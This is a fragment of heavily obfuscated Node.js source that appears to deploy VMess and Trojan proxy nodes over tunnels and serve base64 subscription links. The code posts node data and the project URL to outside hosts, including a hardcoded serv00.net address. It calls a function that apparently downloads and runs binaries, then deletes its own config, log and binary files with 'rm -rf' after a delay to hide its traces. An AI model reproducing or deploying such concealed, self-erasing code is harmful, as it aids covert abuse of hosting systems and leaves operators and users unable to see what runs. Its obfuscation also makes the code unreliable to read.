_0x35bc6f={_0x369477:0x10c,_0x2dc9d4:0xf2,_0x551aaf:0xf3},_0x35a25d=_0x195b,_0x4f6c67={'v':'2','ps':''+_0x44a134,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x35a25d(0x100),'net':'ws','type':_0x35a25d(0x100),'host':_0xdbcd43,'path':'/vmess-argo?ed=2560','tls':_0x35a25d(0x143),'sni':_0xdbcd43,'alpn':'','fp':'firefox'},_0x4ababb=_0x35a25d(0x14b)+UUID+'@'+CFIP+':'+CFPORT+_0x35a25d(0x118)+_0xdbcd43+_0x35a25d(_0x645a5a._0x4aab54)+_0xdbcd43+_0x35a25d(_0x645a5a._0x55fa25)+_0x44a134+_0x35a25d(_0x645a5a._0x4f99ac)+Buffer['from'](JSON[_0x35a25d(_0x645a5a._0x2737f0)](_0x4f6c67))[_0x35a25d(_0x645a5a._0x13d713)](_0x35a25d(_0x645a5a._0x343548))+_0x35a25d(_0x645a5a._0x1ccaf3)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xdbcd43+_0x35a25d(0x181)+_0xdbcd43+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x44a134+_0x35a25d(_0x645a5a._0x30502b);console[_0x35a25d(0x115)](Buffer[_0x35a25d(_0x645a5a._0x7aee93)](_0x4ababb)['toString'](_0x35a25d(_0x645a5a._0x122701))),fs['writeFileSync'](subPath,Buffer[_0x35a25d(_0x645a5a._0x7aee93)](_0x4ababb)[_0x35a25d(0x10c)]('base64')),console[_0x35a25d(_0x645a5a._0xa78fdf)](FILE_PATH+_0x35a25d(_0x645a5a._0x2ec21c)),uploadNodes(),app[_0x35a25d(0x104)]('/'+SUB_PATH,(_0x4a83e9,_0x4f6c89)=>{const _0x3464c9=_0x35a25d,_0x47eb24=Buffer[_0x3464c9(0x153)](_0x4ababb)[_0x3464c9(_0x35bc6f._0x369477)]('base64');_0x4f6c89[_0x3464c9(0xe8)](_0x3464c9(0x123),_0x3464c9(_0x35bc6f._0x2dc9d4)),_0x4f6c89[_0x3464c9(_0x35bc6f._0x551aaf)](_0x47eb24);}),_0x443893(_0x4ababb);},0x7d0);});}}async function uploadNodes(){const _0x2d56a1={_0x34aa3d:0xea,_0x236a78:0x198,_0xf96a4f:0x179,_0x24f738:0x122,_0x43398d:0x150,_0x310b45:0xed,_0x55b169:0xfa,_0x26b403:0x115},_0x357993=_0x1c39ba;if(UPLOAD_URL&&PROJECT_URL){const _0x5c4ab3=PROJECT_URL+'/'+SUB_PATH,_0x673c9={'subscription':[_0x5c4ab3]};try{const _0x2ae437=await axios[_0x357993(0x124)](UPLOAD_URL+_0x357993(_0x2d56a1._0x34aa3d),_0x673c9,{'headers':{'Content-Type':'application/json'}});return _0x2ae437&&_0x2ae437['status']===0xc8?(console['log'](_0x357993(_0x2d56a1._0x236a78)),_0x2ae437):null;}catch(_0x35c821){if(_0x35c821[_0x357993(0x172)]){if(_0x35c821[_0x357993(0x172)][_0x357993(0x134)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x357993(_0x2d56a1._0xf96a4f)](listPath))return;const _0x4a193d=fs[_0x357993(_0x2d56a1._0x24f738)](listPath,_0x357993(_0x2d56a1._0x43398d)),_0x2c4b67=_0x4a193d[_0x357993(_0x2d56a1._0x310b45)]('\x0a')[_0x357993(0x128)](_0x45e051=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x357993(0x14f)](_0x45e051));if(_0x2c4b67[_0x357993(0x175)]===0x0)return;const _0x496718=JSON[_0x357993(0x188)]({'nodes':_0x2c4b67});try{const _0xf6bdc2=await axios[_0x357993(0x124)](UPLOAD_URL+_0x357993(_0x2d56a1._0x55b169),_0x496718,{'headers':{'Content-Type':_0x357993(0x117)}});return _0xf6bdc2&&_0xf6bdc2[_0x357993(0x134)]===0xc8?(console[_0x357993(_0x2d56a1._0x26b403)](_0x357993(0xe4)),_0xf6bdc2):null;}catch(_0xb4e888){return null;}}else return;}}function cleanFiles(){const _0x15186e={_0x5a8ed5:0x19f,_0x2b7d05:0x199};setTimeout(()=>{const _0xc642ea={_0x5867d0:0x159,_0x2970ba:0x115},_0x39760b={_0x485c4:0x115,_0x206645:0x173},_0x49223f=_0x195b,_0x484a99=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x484a99[_0x49223f(0xee)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x484a99[_0x49223f(0xee)](phpPath);process['platform']==='win32'?exec(_0x49223f(_0x15186e._0x5a8ed5)+_0x484a99['join']('\x20')+_0x49223f(_0x15186e._0x2b7d05),_0x6c837b=>{const _0x83100a=_0x49223f;console[_0x83100a(0x159)](),console['log'](_0x83100a(0x110)),console[_0x83100a(_0x39760b._0x485c4)](_0x83100a(_0x39760b._0x206645));}):exec('rm\x20-rf\x20'+_0x484a99[_0x49223f(0x17d)]('\x20')+_0x49223f(0x12c),_0x475332=>{const _0x2aea81=_0x49223f;console[_0x2aea81(_0xc642ea._0x5867d0)](),console[_0x2aea81(0x115)](_0x2aea81(0x110)),console[_0x2aea81(_0xc642ea._0x2970ba)](_0x2aea81(0x173));});},0x15f90);}function _0x195b(_0x12b254,_0x4ce55b){const _0x466d61=_0x466d();return _0x195b=function(_0x195b42,_0xb22114){_0x195b42=_0x195b42-0xdb;let _0xf65753=_0x466d61[_0x195b42];return _0xf65753;},_0x195b(_0x12b254,_0x4ce55b);}cleanFiles();async function AddVisitTask(){const _0x58d4b5={_0x12a22b:0x115,_0x4b45f3:0x124,_0x29aede:0x115,_0x51e787:0x165,_0x410980:0x106,_0x1fbc1c:0xf8},_0x304d57=_0x1c39ba;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x304d57(_0x58d4b5._0x12a22b)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3d1806=await axios[_0x304d57(_0x58d4b5._0x4b45f3)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x304d57(_0x58d4b5._0x29aede)](_0x304d57(_0x58d4b5._0x51e787)),_0x3d1806;}catch(_0x1f8384){return console[_0x304d57(0x194)](_0x304d57(_0x58d4b5._0x410980)+_0x1f8384[_0x304d57(_0x58d4b5._0x1fbc1c)]),null;}}async function startserver(){const _0x3d0417={_0x295dc5:0xe7},_0x2a7a13=_0x1c39ba;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x54eb1f){console[_0x2a7a13(0x194)](_0x2a7a13(_0x3d0417._0x295dc5),_0x54eb1f);}}startserver()['catch'](_0x1c27af=>{const _0x407f20=_0x1c39ba;console[_0x407f20(0x194)](_0x407f20(0xfb),_0x1c27af);}),app[_0x1c39ba(0x158)](PORT,()=>console[_0x1c39ba(0x115)](_0x1c39ba(0xde)+PORT+'!'));
